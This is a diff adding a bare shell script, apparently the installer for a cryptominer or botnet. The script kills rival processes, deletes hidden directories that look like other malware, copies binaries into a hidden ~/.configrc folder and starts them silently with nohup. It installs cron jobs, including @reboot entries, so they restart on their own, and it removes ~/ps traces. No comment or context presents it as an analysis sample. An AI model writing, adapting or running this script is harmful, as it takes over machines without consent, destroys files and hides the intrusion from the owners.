@@ -1,0 +1,49 @@
+pkill -9 go> .out
+pkill -9 run> .out
+pkill -9 tsm> .out
+kill -9 `ps x|grep run|grep -v grep|awk '{print $1}'`> .out
+kill -9 `ps x|grep go|grep -v grep|awk '{print $1}'`> .out
+kill -9 `ps x|grep tsm|grep -v grep|awk '{print $1}'`> .out
+
+pwd > dir.dir
+dir=$(cat dir.dir)
+cd $dir
+chmod 777 *
+
+rm -rf cron.d
+rm -rf ~/.nullcach*
+rm -rf ~/.firefoxcatch*
+rm -rf ~/.bashtem*
+rm -rf ~/.configrc*
+mkdir ~/.configrc
+cp -r a ~/.configrc/
+cp -r b ~/.configrc/
+
+cd ~/.configrc/a/
+nohup ./init0 >> /dev/null &
+sleep 5s
+nohup ./a >>/dev/null &
+cd ~/.configrc/b/
+nohup ./a >>/dev/null &
+
+cd $dir
+cd c
+nohup ./start >>/dev/null &
+cd ~/.configrc/
+pwd > dir2.dir
+dir2=$(cat dir2.dir)
+
+echo "1 1 */2 * * $dir2/a/upd>/dev/null 2>&1
+@reboot $dir2/a/upd>/dev/null 2>&1
+5 8 * * 0 $dir2/b/sync>/dev/null 2>&1
+@reboot $dir2/b/sync>/dev/null 2>&1  
+0 0 */3 * * $dir/c/aptitude>/dev/null 2>&1" >> cron.d
+
+sleep 3s
+
+rm -rf ~/ps
+rm -rf ~/ps.*
+
+crontab cron.d
+crontab -l
+
